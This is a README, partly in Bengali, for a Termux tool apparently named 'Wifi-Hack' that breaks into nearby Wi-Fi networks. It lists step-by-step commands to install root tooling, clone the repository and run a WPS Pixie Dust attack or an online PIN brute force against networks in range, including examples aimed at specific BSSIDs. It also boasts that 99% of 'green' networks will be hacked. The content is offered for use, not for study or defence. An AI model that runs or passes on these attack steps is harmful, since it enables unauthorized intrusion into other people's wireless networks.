## Wifi-Hack 🗿
### Hack WIfi Using Termux! (Need Rooted Device )🧑‍💻
### termux দিয়ে wifi হ্যা.ক করুন 

[![Screenshot-20240524-183227-Termux.png](https://i.postimg.cc/qMjPGGTw/Screenshot-20240524-183227-Termux.png)](https://postimg.cc/vcx2YfDx) 

### How to install (কিভাবে ইন্সটল করবেন) :

```bash
apt update && apt upgrade -y
```
```bash
pkg update && pkg upgrade -y
```
```
pkg install git -y
```
```
pkg install python -y
```
```bash
pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw && termux-setup-storage
```
```bash
git clone https://github.com/tanvirhasan999/Wifi-Hack
```
```bash
cd Wifi-Hack
```
```bash
chmod +x fück-wifi.py
```
### Note📝 : Now turn off Wifi (এখন wifi অফ করুন)
```bash
sudo python fück-wifi.py -i wlan0 -K
```
## Note📝: It will show all Wifi within your range. Among them, 99% of Green's will be hacked. And the White ones may also be tried. And the Red ones will not be hacked. (আপনার Range এর ভেতর এর সব Wifi Show করবে। এগুলার ভেতর Green এর গুলা 99% হ্যাক হবে। আর White এর গুলোও হতে পারে চেষ্টা করে দেখবেন।আর যেগুলো Red গুলো হ্যাক হবেনা)

## Enter this command to open Tool next time. (পরের বার Tool অপেন করতে এই command টি দিন।)
```bash
sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K
```

#### Example : `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`

#### Note 📝: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -K`
- Start Pixie Dust attack on a specified BSSID:
`sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python Wifi-Hack/fück-wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
## Thanks For Using My Tool ❤️
